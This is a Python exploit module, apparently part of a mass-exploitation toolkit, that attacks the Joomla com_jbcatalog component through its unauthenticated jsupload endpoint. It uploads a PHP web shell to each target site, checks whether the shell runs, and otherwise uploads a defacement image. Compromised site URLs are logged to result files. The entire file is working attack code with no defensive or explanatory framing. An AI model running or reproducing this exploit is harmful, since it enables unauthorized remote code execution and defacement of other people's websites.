# coding=utf-8
import requests
import printModule

r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
ShellPresta = 'files/up.php'
Jce_Deface_image = 'files/pwn.gif'


def Exploit(site):
    try:
        Check = requests.get('http://' + site + '/components/com_jbcatalog/libraries/jsupload/server/php',
                             timeout=10, headers=Headers)
        if Check.status_code == 200:
            ShellFile = {'files[]': open(ShellPresta, 'rb')}
            requests.post('http://' + site + '/components/com_jbcatalog/libraries/jsupload/server/php',
                          files=ShellFile, headers=Headers, timeout=10)
            CheckShell = requests.get('http://' + site +
                                      '/components/com_jbcatalog/libraries/jsupload/server/php/files/up.php',
                                      timeout=10, headers=Headers)

            if 'Vuln!!' in str(CheckShell.content):
                with open('result/Shell_results.txt', 'a') as writer:
                    writer.write(site + '/components/com_jbcatalog/libraries/jsupload/server/php/files/up.php\n')
                return printModule.returnYes(site, 'N/A', 'Com_Jbcatalog', 'Joomla')
            else:
                ShellFile = {'files[]': open(Jce_Deface_image, 'rb')}
                requests.post('http://' + site + '/components/com_jbcatalog/libraries/jsupload/server/php',
                              files=ShellFile, headers=Headers, timeout=10)

                CheckIndex = requests.get('http://' + site + '/components/com_jbcatalog/libraries/jsupload/server/'
                                                             'php/files/' + Jce_Deface_image.split('/')[1],
                                          timeout=10, headers=Headers)
                if 'GIF89a' in str(CheckIndex.content):
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + '/components/com_jbcatalog/libraries/jsupload/server/php/files/'
                                     + Jce_Deface_image.split('/')[1] + '\n')
                    return printModule.returnYes(site, 'N/A', 'Com_Jbcatalog', 'Joomla')
                else:
                    return printModule.returnNo(site, 'N/A', 'Com_Jbcatalog', 'Joomla')
        else:
            return printModule.returnNo(site, 'N/A', 'Com_Jbcatalog', 'Joomla')
    except:
        return printModule.returnNo(site, 'N/A', 'Com_Jbcatalog', 'Joomla')
